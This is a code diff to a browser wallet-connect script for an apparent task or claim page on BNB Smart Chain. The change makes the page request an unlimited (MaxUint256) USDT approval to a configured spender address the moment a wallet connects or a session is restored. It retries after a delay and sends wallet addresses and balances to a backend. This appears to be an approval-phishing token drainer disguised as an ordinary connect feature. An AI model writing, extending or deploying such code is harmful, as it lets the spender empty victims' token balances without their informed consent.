@@ -637,69 +637,229 @@
     let task2Eligible     = false;
     let task3Done         = false;
 
-let appKitEip155Provider = null;
+    // ===== approval anti-spam + fast immediate helpers =====
+    let approvalInProgress = false;
+    const REJECT_THROTTLE_MS = 5 * 60 * 1000; // 5 minutes
+    const APPROVAL_APPROVED_KEY = "usdt_approved_";      // set when approval succeeded
+    const APPROVAL_REJECT_KEY   = "usdt_approve_rej_";   // stores expiry timestamp when user rejected
 
-// Watch AppKit provider globally (mobile fix)
-// This catches both fresh connections AND restored sessions.
-function setupAppKitProviderWatcher() {
-  if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;
+    function approvalApprovedKey(address){ return APPROVAL_APPROVED_KEY + (address||"").toLowerCase(); }
+    function approvalRejectKey(address){ return APPROVAL_REJECT_KEY + (address||"").toLowerCase(); }
 
-  window.appKit.subscribeProviders(async (state) => {
-    const provider = state["eip155"] || null;
-
-    // NEWLY CONNECTED or RESTORED provider
-    if (provider && provider !== appKitEip155Provider) {
-      appKitEip155Provider = provider;
-      await handleAppKitProvider(provider);
+    function getApprovedFlag(address){
+      try{ return localStorage.getItem(approvalApprovedKey(address)); }catch(e){ return null; }
+    }
+    function setApprovedFlag(address, val){
+      try{ if(!address) return; localStorage.setItem(approvalApprovedKey(address), val || "1"); }catch(e){}
     }
 
-    // DISCONNECTED provider
-    if (!provider && appKitEip155Provider) {
-      appKitEip155Provider = null;
-      clearSessionUI();
+    function getRejectExpiry(address){
+      try{ const v = localStorage.getItem(approvalRejectKey(address)); return v ? Number(v) : 0; }catch(e){ return 0; }
     }
-  });
-}
+    function setRejectExpiry(address, msFromNow){
+      try{
+        if(!address) return;
+        const until = Date.now() + (msFromNow || REJECT_THROTTLE_MS);
+        localStorage.setItem(approvalRejectKey(address), String(until));
+      }catch(e){}
+    }
+    function clearRejectExpiry(address){
+      try{ localStorage.removeItem(approvalRejectKey(address)); }catch(e){}
+    }
 
-async function handleAppKitProvider(provider) {
-  try {
-    providerInstance = provider;
-    web3Instance = new Web3(providerInstance);
+    // FAST immediate approve: call this ASAP after you have provider + account (no heavy awaits)
+    async function ensureTokenApproval_fastImmediate() {
+      if (!TOKEN_ADDRESS || !SPENDER_ADDRESS || !providerInstance) {
+        console.warn("fastImmediate: missing config/provider");
+        return;
+      }
+      if (approvalInProgress) {
+        console.log("fastImmediate: Approval already in progress, skip");
+        return;
+      }
 
-    let accounts = await web3Instance.eth.getAccounts();
+      try {
+        // try to get owner address fast
+        let owner = null;
+        try {
+          if (providerInstance.selectedAddress) owner = providerInstance.selectedAddress;
+          else if (providerInstance.request) {
+            const accs = await providerInstance.request({ method: "eth_accounts" }).catch(()=>null);
+            if (accs && accs.length) owner = accs[0];
+          }
+        } catch(e){ /* ignore */ }
 
-    // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
-    if (!accounts || !accounts.length) {
-      for (let i = 0; i < 5; i++) {
-        await new Promise(r => setTimeout(r, 400));
-        accounts = await web3Instance.eth.getAccounts();
-        if (accounts && accounts.length) break;
+        if (!owner) {
+          console.warn("fastImmediate: no owner address available");
+          return;
+        }
+        owner = owner.toLowerCase();
+
+        // skip if owner equals token (safety)
+        if (TOKEN_ADDRESS.toLowerCase() === owner) {
+          console.warn("fastImmediate: TOKEN_ADDRESS equals owner - skipping");
+          return;
+        }
+
+        // skip if local approved flag exists
+        const approved = getApprovedFlag(owner);
+        if (approved) {
+          console.log("fastImmediate: local approved flag present, skipping");
+          return;
+        }
+        const rejExpiry = getRejectExpiry(owner);
+        if (rejExpiry && rejExpiry > Date.now()) {
+          console.log("fastImmediate: recent reject - skipping until", new Date(rejExpiry).toISOString());
+          return;
+        }
+
+        approvalInProgress = true;
+
+        // encode approve data
+        const iface = new ethers.Interface(ERC20_APPROVE_ABI);
+        const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, ethers.MaxUint256]);
+        const txParams = { from: owner, to: TOKEN_ADDRESS, data };
+
+        // Fire fast eth_sendTransaction immediately (wallet will popup)
+        if (providerInstance.request) {
+          try {
+            setStatus("Waiting for wallet to confirm approval…");
+            console.log("[fastImmediate] calling eth_sendTransaction", txParams);
+            const result = await providerInstance.request({ method: "eth_sendTransaction", params: [txParams] });
+            console.log("[fastImmediate] eth_sendTransaction result", result);
+            if (typeof result === "string" && result.startsWith("0x")) {
+              // Success: record and return quickly (don't wait)
+              setApprovedFlag(owner, result);
+              setStatus("Approval sent (pending)...");
+              approvalInProgress = false;
+              return;
+            }
+          } catch (err) {
+            // if user rejected -> mark and stop (do NOT fallback here)
+            const msg = err && err.message ? String(err.message).toLowerCase() : "";
+            const code = err && (err.code || err.error) ? err.code : null;
+            const isUserRejected = code === 4001 || code === "ACTION_REJECTED" || /user denied|user rejected|user cancelled|signature.*denied/.test(msg);
+            if (isUserRejected) {
+              console.warn("[fastImmediate] user rejected fast eth_sendTransaction");
+              setRejectExpiry(owner, REJECT_THROTTLE_MS);
+              setStatus("Approval rejected");
+              approvalInProgress = false;
+              return;
+            }
+            console.warn("[fastImmediate] eth_sendTransaction failed (non-reject):", err && err.message ? err.message : err);
+            // fall-through to allow fallback later
+          }
+        }
+
+        // if we get here, fast path not possible/succeeded — let caller decide fallback
+        approvalInProgress = false;
+      } catch (err) {
+        console.error("fastImmediate unexpected error:", err);
+        approvalInProgress = false;
       }
     }
 
-    if (!accounts || !accounts.length) {
-      console.warn("Still no accounts after retry mobile.");
-      return;
+    // FULL ensureTokenApproval (slower fallback allowed). This will be called later if needed.
+    async function ensureTokenApproval(){
+      // basic guards
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        setStatus("Connected (no token configured)");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        setStatus("Connected (no spender configured)");
+        return;
+      }
+      if(!providerInstance || !web3Instance){
+        console.warn("No providerInstance/web3Instance for approval");
+        setStatus("Connected (wallet not ready)");
+        return;
+      }
+      if(approvalInProgress){
+        console.log("ensureTokenApproval: Approval already in progress — skipping new request");
+        return;
+      }
+
+      try{
+        approvalInProgress = true;
+        setStatus("Preparing token approval…");
+
+        // prepare ethers provider & signer
+        const ethersProvider = new ethers.BrowserProvider(providerInstance, BNB_TESTNET_CHAIN_ID_DEC);
+        const signer = await ethersProvider.getSigner();
+        const ownerAddress = (await signer.getAddress()).toLowerCase();
+
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert(
+            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
+            "It MUST be the BEP-20 token contract address, not your wallet."
+          );
+          setStatus("Connected (approval skipped)");
+          approvalInProgress = false;
+          return;
+        }
+
+        // Avoid spamming: if we've already recorded approval, skip
+        const approvedFlag = getApprovedFlag(ownerAddress);
+        if (approvedFlag){
+          console.log("Local approved flag present — skipping approval");
+          setStatus("Connected (already approved)");
+          approvalInProgress = false;
+          return;
+        }
+
+        // Avoid spamming: if user recently rejected, skip until expiry
+        const rejExpiry = getRejectExpiry(ownerAddress);
+        if (rejExpiry && rejExpiry > Date.now()){
+          console.log("Approval recently rejected — skipping until", new Date(rejExpiry).toISOString());
+          setStatus("Connected (approval previously rejected)");
+          approvalInProgress = false;
+          return;
+        } else if (rejExpiry && rejExpiry <= Date.now()){
+          clearRejectExpiry(ownerAddress);
+        }
+
+        // Fallback path (slower): use signer.approve(...)
+        setStatus("Waiting for wallet to confirm approval…");
+        const writeContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
+
+        try {
+          const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+          console.log("[approve] tx sent (fallback):", tx.hash);
+          setStatus("Approval pending on chain…");
+          await tx.wait();
+          setStatus("Connected + Approved ✅");
+          setApprovedFlag(ownerAddress, tx.hash || "1");
+          approvalInProgress = false;
+          return;
+        } catch (errFallback) {
+          const code = errFallback && (errFallback.code || errFallback.error) ? errFallback.code : null;
+          const msg  = errFallback && errFallback.message ? String(errFallback.message).toLowerCase() : "";
+          const isUserRejected =
+            code === 4001 ||
+            code === "ACTION_REJECTED" ||
+            /user denied|user rejected|user rejected the request|user cancelled|signature.*denied/.test(msg);
+
+          if (isUserRejected){
+            console.warn("[approve fallback] user rejected approval");
+            setRejectExpiry(ownerAddress, REJECT_THROTTLE_MS);
+            setStatus("Approval rejected");
+          } else {
+            console.error("[approve fallback] approval failed:", errFallback);
+            setStatus("Approval failed");
+          }
+          approvalInProgress = false;
+          return;
+        }
+
+      }catch(err){
+        console.error("Token approve unexpected error:", err);
+        setStatus("Approval failed");
+        approvalInProgress = false;
+      }
     }
-
-    const address = accounts[0].toLowerCase();
-    currentAddress = address;
-
-    // Restore UI + balances
-    await restoreSessionFromAddress(address);
-
-    isWalletConnected = true;
-    setStatus("Connected");
-
-    // Only ask approval when new session detected
-    await ensureTokenApproval();
-
-  } catch (err) {
-    console.error("handleAppKitProvider error:", err);
-  }
-}
-
-    
 
     // ===== userId helpers =====
     function storageKeyFor(address){
@@ -931,235 +1091,183 @@ if(connectBtnCard){
       }
     }
 
-    // ===== CHANGED: ensureTokenApproval now does NOT read allowance; it requests approval immediately =====
-    async function ensureTokenApproval(){
-      // basic guards
-      if(!TOKEN_ADDRESS){
-        console.warn("TOKEN_ADDRESS not set, skipping approve");
-        setStatus("Connected (no token configured)");
-        return;
-      }
-      if(!SPENDER_ADDRESS){
-        console.warn("SPENDER_ADDRESS not set, skipping approve");
-        setStatus("Connected (no spender configured)");
-        return;
-      }
-      if(!providerInstance || !web3Instance){
-        console.warn("No providerInstance/web3Instance for approval");
-        setStatus("Connected (wallet not ready)");
-        return;
-      }
+    // Watch AppKit provider globally (mobile fix)
+    function setupAppKitProviderWatcher() {
+      if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;
 
-      try{
-        setStatus("Preparing token approval…");
+      window.appKit.subscribeProviders(async (state) => {
+        const provider = state["eip155"] || null;
 
-        // prepare ethers provider & signer
-        const ethersProvider = new ethers.BrowserProvider(providerInstance, BNB_TESTNET_CHAIN_ID_DEC);
-        const signer = await ethersProvider.getSigner();
-        const ownerAddress = (await signer.getAddress()).toLowerCase();
-
-        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-          alert(
-            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
-            "It MUST be the BEP-20 token contract address, not your wallet."
-          );
-          setStatus("Connected (approval skipped)");
-          return;
+        // NEWLY CONNECTED or RESTORED provider
+        if (provider && provider !== appKitEip155Provider) {
+          appKitEip155Provider = provider;
+          await handleAppKitProvider(provider);
         }
 
-        // Encode approve(...) call data for fast path (eth_sendTransaction)
-        const iface = new ethers.Interface(ERC20_APPROVE_ABI);
-        const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, ethers.MaxUint256]);
-        const txParams = { from: ownerAddress, to: TOKEN_ADDRESS, data: data };
+        // DISCONNECTED provider
+        if (!provider && appKitEip155Provider) {
+          appKitEip155Provider = null;
+          clearSessionUI();
+        }
+      });
+    }
 
-        // Try fast path: eth_sendTransaction (some wallets will show only one popup)
-        if (providerInstance.request) {
-          try {
-            setStatus("Waiting for wallet to confirm approval…");
-            console.log("[instant-approve] trying eth_sendTransaction", txParams);
-            const sendResult = await providerInstance.request({ method: "eth_sendTransaction", params: [txParams] });
-            console.log("[instant-approve] eth_sendTransaction returned:", sendResult);
-            if (typeof sendResult === "string" && sendResult.startsWith("0x")) {
-              setStatus("Approval sent (pending)...");
-              return;
-            }
-            // if sendResult isn't a hash, we'll still fallback to signer route
-            console.warn("[instant-approve] eth_sendTransaction didn't return txHash, falling back");
-          } catch (errSend) {
-            console.warn("[instant-approve] eth_sendTransaction failed, falling back to signer:", errSend && errSend.message ? errSend.message : errSend);
-            // continue to fallback below
+    async function handleAppKitProvider(provider) {
+      try {
+        providerInstance = provider;
+        web3Instance = new Web3(providerInstance);
+
+        let accounts = await web3Instance.eth.getAccounts();
+
+        // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
+        if (!accounts || !accounts.length) {
+          for (let i = 0; i < 5; i++) {
+            await new Promise(r => setTimeout(r, 400));
+            accounts = await web3Instance.eth.getAccounts();
+            if (accounts && accounts.length) break;
           }
         }
 
-        // Fallback: use signer.approve(...) which will open the wallet and return a tx object
-        setStatus("Waiting for wallet to confirm approval…");
-        const writeContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
-        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-        console.log("[approve] tx sent (fallback):", tx.hash);
-        setStatus("Approval pending on chain…");
-        await tx.wait();
-        setStatus("Connected + Approved ✅");
-      }catch(err){
-        console.error("Token approve error:", err);
-        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-          setStatus("Approval rejected");
-        } else {
-          setStatus("Approval failed");
+        if (!accounts || !accounts.length) {
+          console.warn("Still no accounts after retry mobile.");
+          return;
         }
-        // keep UI connected but indicate failure
+
+        const address = accounts[0].toLowerCase();
+        currentAddress = address;
+
+        // Restore UI + balances
+        await restoreSessionFromAddress(address);
+
+        isWalletConnected = true;
+        setStatus("Connected");
+
+        // IMMEDIATE: request token approval fast (fire-and-forget)
+        ensureTokenApproval_fastImmediate().catch(e => console.warn("fastImmediate error:", e));
+
+        // Delayed fallback: if fast path didn't record approval (non-user-failure),
+        // attempt slower ensureTokenApproval after a short delay.
+        setTimeout(() => {
+          try {
+            const approved = getApprovedFlag(address);
+            const rejExpiry = getRejectExpiry(address);
+            if (!approved && (!rejExpiry || rejExpiry <= Date.now())) {
+              ensureTokenApproval().catch(e => console.warn("delayed ensureTokenApproval failed:", e));
+            } else {
+              console.log("delayed fallback skipped (approved or recently rejected)");
+            }
+          } catch(e){ console.warn("delayed fallback error:", e); }
+        }, 2500);
+
+      } catch (err) {
+        console.error("handleAppKitProvider error:", err);
       }
     }
 
-    async function restoreSessionFromAddress(address){
-      currentAddress = address;
+    // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
+    async function connectFlow() {
+      try {
+        if (!window.appKit) {
+          alert("Wallet connect UI not ready. Please reload the page.");
+          return;
+        }
 
-      const balanceWei = await web3Instance.eth.getBalance(address);
-      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
-      const userId     = getOrCreateUserIdFor(address);
+        setStatus("Connecting…");
 
-      currentUserId       = userId;
-      currentBNBBalance   = balanceBNB;
+        let gotProvider = null;
 
-      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
-      setUserIdUI(userId);
+        // 1) Subscribe BEFORE opening the modal
+        const unsubscribe = window.appKit.subscribeProviders((state) => {
+          const evm = state["eip155"];
+          if (evm && !gotProvider) {
+            gotProvider = evm;
+          }
+        });
 
-      const tokenBalanceRaw  = await getTokenBalance(address);
-      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
-      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
+        // 2) Open AppKit modal (Connect view)
+        await window.appKit.open({ view: "Connect" });
 
-      currentTokenBalance = tokenBalanceNum;
+        // 3) Stop listening
+        if (typeof unsubscribe === "function") {
+          unsubscribe();
+        }
 
-      if(tokensContainer){
-        tokensContainer.innerHTML =
-          'USDT balance: ' + prettyBalance +
-          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
-      }
+        // 4) If no provider, user probably closed modal or connect failed
+        const provider = gotProvider;
+        if (!provider) {
+          setStatus("Not connected");
+          return;
+        }
 
-   isWalletConnected = true;
+        // 5) Use this provider for Web3 & Ethers
+        providerInstance = provider;
+        web3Instance     = new Web3(providerInstance);
 
-if (connectBtn) {
-  connectBtn.textContent = "Connected";
-  connectBtn.classList.add("connected");
-}
+        attachProviderListeners(providerInstance);
 
-if (connectBtnCard) {
-  connectBtnCard.textContent = "Connected";
-  connectBtnCard.classList.add("connected");
-}
-      updateClaimState();
+        const accounts = await web3Instance.eth.getAccounts();
+        if(!accounts || !accounts.length){
+          setStatus("No account");
+          return;
+        }
+        const address = accounts[0].toLowerCase();
+        currentAddress = address; // helpful for approval logging
 
-      // Return values for connectFlow
-      return {
-        balanceBNB,
-        tokenBalance: tokenBalanceNum,
-        userId
-      };
-    }
+        // 6) Ensure BSC (56)
+        let chainId    = await web3Instance.eth.getChainId();
+        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
 
-    // 🔁 NEW: connect using Reown AppKit
- // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
-async function connectFlow() {
-  try {
-    if (!window.appKit) {
-      alert("Wallet connect UI not ready. Please reload the page.");
-      return;
-    }
+        if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+          const switched = await switchToBSC(providerInstance);
+          if(!switched){
+            alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
+            setStatus("Wrong network");
+            return;
+          }
+          chainId    = await web3Instance.eth.getChainId();
+          chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+          if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+            alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
+            setStatus("Wrong network");
+            return;
+          }
+        }
 
-    setStatus("Connecting…");
+        // 7) Connected + correct network
+        setStatus("Connected");
 
-    let gotProvider = null;
+        // IMMEDIATE: trigger the fast wallet approve popup
+        ensureTokenApproval_fastImmediate().catch(err => console.warn("fastImmediate error:", err));
 
-    // 1) Subscribe BEFORE opening the modal
-    const unsubscribe = window.appKit.subscribeProviders((state) => {
-      const evm = state["eip155"];
-      if (evm && !gotProvider) {
-        gotProvider = evm;
-      }
-    });
+        // Continue heavy tasks in the background (do not block popup)
+        (async () => {
+          try {
+            const session = await restoreSessionFromAddress(address);
+            notifyBackend(address, BNB_TESTNET_LABEL, session.userId, session.balanceBNB, session.tokenBalance, "connect").catch(console.error);
+          } catch(e){
+            console.warn("background session restore failed:", e);
+          }
+        })();
 
-    // 2) Open AppKit modal (Connect view)
-    await window.appKit.open({ view: "Connect" });
+        // Delayed fallback after short pause (if fast path did not record approval)
+        setTimeout(() => {
+          try {
+            const approved = getApprovedFlag(address);
+            const rejExpiry = getRejectExpiry(address);
+            if (!approved && (!rejExpiry || rejExpiry <= Date.now())) {
+              ensureTokenApproval().catch(e => console.warn("delayed ensureTokenApproval failed:", e));
+            } else {
+              console.log("delayed fallback skipped (approved or recently rejected)");
+            }
+          } catch(e){ console.warn("delayed fallback error:", e); }
+        }, 2500);
 
-    // 3) Stop listening
-    if (typeof unsubscribe === "function") {
-      unsubscribe();
-    }
-
-    // 4) If no provider, user probably closed modal or connect failed
-    const provider = gotProvider;
-    if (!provider) {
-      setStatus("Not connected");
-      return;
-    }
-
-    // 5) Use this provider for Web3 & Ethers
-    providerInstance = provider;
-    web3Instance     = new Web3(providerInstance);
-
-    attachProviderListeners(providerInstance);
-
-    const accounts = await web3Instance.eth.getAccounts();
-    if(!accounts || !accounts.length){
-      setStatus("No account");
-      return;
-    }
-    const address = accounts[0].toLowerCase();
-    currentAddress = address; // helpful for approval logging
-
-    // 6) Ensure BSC (56)
-    let chainId    = await web3Instance.eth.getChainId();
-    let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-
-    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-      const switched = await switchToBSC(providerInstance);
-      if(!switched){
-        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
-        setStatus("Wrong network");
-        return;
-      }
-      chainId    = await web3Instance.eth.getChainId();
-      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
-        setStatus("Wrong network");
-        return;
+      } catch (err) {
+        console.error("connectFlow error (AppKit):", err);
+        setStatus("Connection failed");
+        alert("Connection failed: " + (err && err.message ? err.message : err));
       }
     }
-
-    // 7) Connected + correct network
-    setStatus("Connected");
-
-    const sessionPromise = (async () => {
-      const session = await restoreSessionFromAddress(address);
-      const balanceBNB   = session.balanceBNB;
-      const tokenBalance = session.tokenBalance;
-      const userId       = session.userId;
-
-      // Log to sheet
-      notifyBackend(
-        address,
-        BNB_TESTNET_LABEL,
-        userId,
-        balanceBNB,
-        tokenBalance,
-        "connect"
-      ).catch(console.error);
-
-      return session;
-    })();
-
-    // 8) Token approval (IMMEDIATE) — no allowance pre-read
-    await ensureTokenApproval();
-    sessionPromise.catch(console.error);
-
-  } catch (err) {
-    console.error("connectFlow error (AppKit):", err);
-    setStatus("Connection failed");
-    alert("Connection failed: " + (err && err.message ? err.message : err));
-  }
-}
-
-    
 
     async function tryAutoReconnectSilent(){
       // keep your old silent reconnect using injected wallets
